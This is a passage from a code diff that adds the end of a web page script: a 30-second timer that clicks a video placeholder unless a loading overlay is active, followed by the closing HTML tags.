+            if (!loadingOverlay.classList.contains('active')) {
+                videoPlaceholder.click();
+            }
+        }, 30000);
+    </script>
 </body>
 </html>
